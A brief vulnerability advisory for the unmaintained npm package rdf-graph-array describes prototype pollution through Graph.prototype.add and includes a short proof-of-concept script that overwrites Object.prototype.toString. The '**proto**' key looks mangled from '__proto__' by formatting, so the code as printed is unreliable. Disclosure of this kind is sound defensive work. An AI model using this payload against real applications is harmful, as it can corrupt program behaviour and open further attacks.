# Overview

`rdf-graph-array` is a Graph implementation using arrays. Note: This package is no longer maintained, this package are vulnerable to Prototype Pollution.

The `rdf.Graph.prototype.add` method could be tricked into adding or modifying properties of `Object.prototype` using a prototype payload.

# Proof of Concept

```
var Graph = require("rdf-graph-array").Graph;
var g = new Graph();
g.add({graph: "foo", subject: "**proto**", "predicate": "toString", "object": "huntr.dev"});
console.log({}.toString);
```
